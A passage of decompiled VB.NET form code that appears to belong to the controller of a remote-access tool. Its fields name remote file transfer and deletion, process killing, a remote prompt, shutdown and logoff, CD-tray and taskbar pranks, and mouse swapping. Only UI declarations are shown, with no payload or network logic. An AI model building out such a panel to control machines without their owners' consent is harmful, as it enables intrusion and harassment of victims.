        Friend Overridable Property UploadFileToolStripMenuItem1 As ToolStripMenuItem
            <DebuggerNonUserCode> _
            Get
                Return Me._UploadFileToolStripMenuItem1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As ToolStripMenuItem)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.UploadFileToolStripMenuItem1_Click)
                If (Not Me._UploadFileToolStripMenuItem1 Is Nothing) Then
                    RemoveHandler Me._UploadFileToolStripMenuItem1.Click, handler
                End If
                Me._UploadFileToolStripMenuItem1 = value
                If (Not Me._UploadFileToolStripMenuItem1 Is Nothing) Then
                    AddHandler Me._UploadFileToolStripMenuItem1.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property UploadFileToolStripMenuItem2 As ToolStripMenuItem
            <DebuggerNonUserCode> _
            Get
                Return Me._UploadFileToolStripMenuItem2
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As ToolStripMenuItem)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.UploadFileToolStripMenuItem2_Click)
                If (Not Me._UploadFileToolStripMenuItem2 Is Nothing) Then
                    RemoveHandler Me._UploadFileToolStripMenuItem2.Click, handler
                End If
                Me._UploadFileToolStripMenuItem2 = value
                If (Not Me._UploadFileToolStripMenuItem2 Is Nothing) Then
                    AddHandler Me._UploadFileToolStripMenuItem2.Click, handler
                End If
            End Set
        End Property


        ' Fields
        Private Shared __ENCList As List(Of WeakReference) = New List(Of WeakReference)
        <AccessedThroughProperty("btn_changewp")> _
        Private _btn_changewp As FlatButton
        <AccessedThroughProperty("btn_closecd")> _
        Private _btn_closecd As FlatButton
        <AccessedThroughProperty("btn_hidedi")> _
        Private _btn_hidedi As FlatButton
        <AccessedThroughProperty("btn_hidetb")> _
        Private _btn_hidetb As FlatButton
        <AccessedThroughProperty("btn_logoff")> _
        Private _btn_logoff As FlatButton
        <AccessedThroughProperty("btn_opencd")> _
        Private _btn_opencd As FlatButton
        <AccessedThroughProperty("btn_openweb")> _
        Private _btn_openweb As FlatButton
        <AccessedThroughProperty("btn_restart")> _
        Private _btn_restart As FlatButton
        <AccessedThroughProperty("btn_send")> _
        Private _btn_send As FlatStickyButton
        <AccessedThroughProperty("btn_showdi")> _
        Private _btn_showdi As FlatButton
        <AccessedThroughProperty("btn_showtb")> _
        Private _btn_showtb As FlatButton
        <AccessedThroughProperty("btn_shutdown")> _
        Private _btn_shutdown As FlatButton
        <AccessedThroughProperty("btn_speak")> _
        Private _btn_speak As FlatButton
        <AccessedThroughProperty("btn_startdiscomouse")> _
        Private _btn_startdiscomouse As FlatButton
        <AccessedThroughProperty("btn_stopdiscomouse")> _
        Private _btn_stopdiscomouse As FlatButton
        <AccessedThroughProperty("btn_swap")> _
        Private _btn_swap As FlatButton
        <AccessedThroughProperty("btn_test")> _
        Private _btn_test As FlatStickyButton
        <AccessedThroughProperty("btn_undo")> _
        Private _btn_undo As FlatButton
        <AccessedThroughProperty("cb_drive")> _
        Private _cb_drive As FlatComboBox
        <AccessedThroughProperty("ColumnHeader1")> _
        Private _ColumnHeader1 As ColumnHeader
        <AccessedThroughProperty("ColumnHeader10")> _
        Private _ColumnHeader10 As ColumnHeader
        <AccessedThroughProperty("ColumnHeader2")> _
        Private _ColumnHeader2 As ColumnHeader
        <AccessedThroughProperty("ColumnHeader3")> _
        Private _ColumnHeader3 As ColumnHeader
        <AccessedThroughProperty("ColumnHeader4")> _
        Private _ColumnHeader4 As ColumnHeader
        <AccessedThroughProperty("ColumnHeader5")> _
        Private _ColumnHeader5 As ColumnHeader
        <AccessedThroughProperty("ColumnHeader6")> _
        Private _ColumnHeader6 As ColumnHeader
        <AccessedThroughProperty("ColumnHeader7")> _
        Private _ColumnHeader7 As ColumnHeader
        <AccessedThroughProperty("ColumnHeader8")> _
        Private _ColumnHeader8 As ColumnHeader
        <AccessedThroughProperty("ColumnHeader9")> _
        Private _ColumnHeader9 As ColumnHeader
        <AccessedThroughProperty("ComboBox1")> _
        Private _ComboBox1 As FlatComboBox
        <AccessedThroughProperty("ComboBox2")> _
        Private _ComboBox2 As FlatComboBox
        <AccessedThroughProperty("CopyFileToolStripMenuItem")> _
        Private _CopyFileToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("CopyThisFolderToolStripMenuItem")> _
        Private _CopyThisFolderToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("CreateNewFileToolStripMenuItem")> _
        Private _CreateNewFileToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("CreateNewFileToolStripMenuItem1")> _
        Private _CreateNewFileToolStripMenuItem1 As ToolStripMenuItem
        <AccessedThroughProperty("CreateNewFileToolStripMenuItem2")> _
        Private _CreateNewFileToolStripMenuItem2 As ToolStripMenuItem
        <AccessedThroughProperty("CreateNewFileToolStripMenuItem3")> _
        Private _CreateNewFileToolStripMenuItem3 As ToolStripMenuItem
        <AccessedThroughProperty("CreateNewFolderToolStripMenuItem")> _
        Private _CreateNewFolderToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("CreateNewFolderToolStripMenuItem1")> _
        Private _CreateNewFolderToolStripMenuItem1 As ToolStripMenuItem
        <AccessedThroughProperty("DeleteFileToolStripMenuItem")> _
        Private _DeleteFileToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("DeleteFolderToolStripMenuItem")> _
        Private _DeleteFolderToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("DotNetBarTabcontrol1")> _
        Private _DotNetBarTabcontrol1 As DotNetBarTabcontrol
        <AccessedThroughProperty("DownloadFileToolStripMenuItem")> _
        Private _DownloadFileToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("FlatCloseSY1")> _
        Private _FlatCloseSY1 As FlatCloseSY
        <AccessedThroughProperty("FlatGroupBox1")> _
        Private _FlatGroupBox1 As FlatGroupBox
        <AccessedThroughProperty("FlatGroupBox2")> _
        Private _FlatGroupBox2 As FlatGroupBox
        <AccessedThroughProperty("FlatLabel1")> _
        Private _FlatLabel1 As FlatLabel
        <AccessedThroughProperty("FlatLabel2")> _
        Private _FlatLabel2 As FlatLabel
        <AccessedThroughProperty("FlatLabel3")> _
        Private _FlatLabel3 As FlatLabel
        <AccessedThroughProperty("FlatMax1")> _
        Private _FlatMax1 As FlatMax
        <AccessedThroughProperty("FlatMini1")> _
        Private _FlatMini1 As FlatMini
        <AccessedThroughProperty("FlatStatusBar_IS")> _
        Private _FlatStatusBar_IS As FlatStatusBar
        <AccessedThroughProperty("FlatStatusBar1")> _
        Private _FlatStatusBar1 As FlatStatusBar
        <AccessedThroughProperty("FlatStatusBarprocess")> _
        Private _FlatStatusBarprocess As FlatStatusBar
        <AccessedThroughProperty("FormSkin1")> _
        Private _FormSkin1 As FormSkin
        <AccessedThroughProperty("ImageList_FileManager")> _
        Private _ImageList_FileManager As ImageList
        <AccessedThroughProperty("ImageList_Info")> _
        Private _ImageList_Info As ImageList
        <AccessedThroughProperty("KillProcessToolStripMenuItem")> _
        Private _KillProcessToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("Label1")> _
        Private _Label1 As Label
        <AccessedThroughProperty("ListBox_Software")> _
        Private _ListBox_Software As ListBox
        <AccessedThroughProperty("listprocess")> _
        Private _listprocess As ListView
        <AccessedThroughProperty("ListView1")> _
        Private _ListView1 As ListView
        <AccessedThroughProperty("MoveFileToolStripMenuItem")> _
        Private _MoveFileToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("MoveThisFolderToolStripMenuItem")> _
        Private _MoveThisFolderToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("NewProcessToolStripMenuItem")> _
        Private _NewProcessToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("PictureBox1")> _
        Private _PictureBox1 As PictureBox
        <AccessedThroughProperty("Prompt")> _
        Private _Prompt As FlatLabel
        <AccessedThroughProperty("RefreshToolStripMenuItem")> _
        Private _RefreshToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("RefreshToolStripMenuItem1")> _
        Private _RefreshToolStripMenuItem1 As ToolStripMenuItem
        <AccessedThroughProperty("RefreshToolStripMenuItem2")> _
        Private _RefreshToolStripMenuItem2 As ToolStripMenuItem
        <AccessedThroughProperty("RefreshToolStripMenuItem3")> _
        Private _RefreshToolStripMenuItem3 As ToolStripMenuItem
        <AccessedThroughProperty("RenameFileToolStripMenuItem")> _
        Private _RenameFileToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("RenameFolderToolStripMenuItem")> _
        Private _RenameFolderToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("rightclick_filemanagerfiles")> _
        Private _rightclick_filemanagerfiles As ContextMenuStrip
        <AccessedThroughProperty("rightclick_filemanagerfolders")> _
        Private _rightclick_filemanagerfolders As ContextMenuStrip
        <AccessedThroughProperty("rightclick_IS")> _
        Private _rightclick_IS As ContextMenuStrip
        <AccessedThroughProperty("rightclick_nothing")> _
        Private _rightclick_nothing As ContextMenuStrip
        <AccessedThroughProperty("rightclickprocess")> _
        Private _rightclickprocess As ContextMenuStrip
        <AccessedThroughProperty("rightclicksystem")> _
        Private _rightclicksystem As ContextMenuStrip
        <AccessedThroughProperty("rtb_prompt")> _
        Private _rtb_prompt As RichTextBox
        <AccessedThroughProperty("shareclient")> _
        Private _shareclient As WebClient
        <AccessedThroughProperty("TabPage1")> _
        Private _TabPage1 As TabPage
        <AccessedThroughProperty("TabPage2")> _
        Private _TabPage2 As TabPage
        <AccessedThroughProperty("TabPage3")> _
        Private _TabPage3 As TabPage
        <AccessedThroughProperty("TabPage4")> _
        Private _TabPage4 As TabPage
        <AccessedThroughProperty("TabPage5")> _
        Private _TabPage5 As TabPage
        <AccessedThroughProperty("TabPage6")> _
        Private _TabPage6 As TabPage
        <AccessedThroughProperty("tb_path")> _
        Private _tb_path As TextBox
        <AccessedThroughProperty("tb_title")> _
        Private _tb_title As FlatTextBox
        <AccessedThroughProperty("ToolStripMenuItem1")> _
        Private _ToolStripMenuItem1 As ToolStripMenuItem
        <AccessedThroughProperty("ToolStripMenuItem2")> _
        Private _ToolStripMenuItem2 As ToolStripMenuItem
        <AccessedThroughProperty("TreeView1")> _
        Private _TreeView1 As TreeView
        <AccessedThroughProperty("UploadFileToolStripMenuItem")> _
        Private _UploadFileToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("UploadFileToolStripMenuItem1")> _
        Private _UploadFileToolStripMenuItem1 As ToolStripMenuItem
        <AccessedThroughProperty("UploadFileToolStripMenuItem2")> _
        Private _UploadFileToolStripMenuItem2 As ToolStripMenuItem
        Private components As IContainer
        Public connected As String
        Private d As Thread
        Private f As Thread
        Private g As Thread
        Private nam As String
        Private oldpath As String
        Private path As String
        Private pathnam As String
        Private pathpath As String
        Private s As Thread
        Private server As API
        Private todownloadfile As String
        Private url As String
        Private x As Thread

        ' Nested Types
        Public Delegate Sub DelegateAdd(ByVal software As String)

        Public Delegate Sub DelegateAddDrive(ByVal [text] As String)

        Public Delegate Sub DelegateAddFiles(ByVal txt As String)

        Public Delegate Sub DelegateWrite(ByVal txt As String)
    End Class
End Namespace

